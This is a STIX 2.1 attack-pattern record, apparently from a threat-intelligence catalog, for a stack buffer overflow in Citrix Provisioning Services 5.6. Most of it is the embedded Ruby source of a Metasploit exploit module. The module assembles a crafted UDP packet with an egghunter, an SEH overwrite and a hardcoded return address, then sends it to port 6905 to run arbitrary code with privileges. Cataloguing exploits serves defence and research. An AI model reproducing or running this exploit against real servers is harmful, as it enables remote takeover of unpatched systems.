{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bd062653-d0ef-49da-bf93-5d50c0345173",
    "created": "2024-08-14T16:47:08.141861Z",
    "modified": "2024-08-14T16:47:08.141864Z",
    "name": "Citrix Provisioning Services 5.6 streamprocess.exe Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Citrix Provisioning Services 5.6. By sending a specially crafted packet to the Provisioning Services server, a fixed length buffer on the stack can be overflowed and arbitrary code can be executed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/citrix_streamprocess.rb",
            "external_id": "citrix_streamprocess.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20110123164820/http://secunia.com:80/advisories/42954/"
        },
        {
            "source_name": "reference",
            "url": "http://support.citrix.com/article/CTX127149"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Citrix Provisioning Services 5.6 streamprocess.exe Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Citrix Provisioning Services 5.6.\n        By sending a specially crafted packet to the Provisioning Services server, a fixed\n        length buffer on the stack can be overflowed and arbitrary code can be executed.\n      },\n      'Author'         => 'mog',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '70597'],\n          [ 'ZDI', '11-023' ],\n          [ 'URL', 'http://web.archive.org/web/20110123164820/http://secunia.com:80/advisories/42954/' ],\n          [ 'URL', 'http://support.citrix.com/article/CTX127149' ],\n        ],\n      'DefaultOptions' =>\n        {\n          # best at delaying/preventing target crashing post-exploit\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\", # Only \"\\x00\\x00\" breaks the overflow, but this is safer\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # pop/pop/ret in streamprocess.exe\n          # Service runs and automatically shuts down in Win 7\n          [ 'Windows XP SP3 / Windows Server 2003 SP2 / Windows Vista', { 'Ret' => 0x00423d32 } ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-01-20'))\n\n    register_options([Opt::RPORT(6905)])\n  end\n\n  def exploit\n\n    eggoptions =\n    {\n      :checksum  => true,\n      :eggtag    => 'W00t',\n    }\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    sploit = \"\\x10\\x00\\x02\\x40\"  # message type\n    sploit << rand_text_alpha_upper(30)\n    sploit << \"\\x00\\x01\\x00\\x00\" # length field\n    sploit << rand_text_alpha_upper(400)\n    sploit << hunter\n    sploit << rand_text_alpha_upper(64 - hunter.length)\n\n    sploit << \"\\xEB\\xBE\"                # Jump back 66 bytes to hunter because there's\n    sploit << rand_text_alpha_upper(2)  # only 24 bytes of cyclic copy after ret\n    sploit << [target.ret].pack('V')    # SE handler\n\n    sploit << rand_text_alpha_upper(50) # Need >= 24 bytes to keep the tag out of the stack\n    sploit << egg                       # Payload has a whole page to itself\n\n    print_status(\"Trying target #{target.name}...\")\n\n    connect_udp\n    udp_sock.put(sploit)\n    print_status(\"Exploit sent, wait for egghunter.\")\n    select(nil, nil, nil, 4) # takes about 8 seconds in tests\n\n    handler(udp_sock)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-20",
    "x_mitre_platforms": [
        "win'"
    ]
}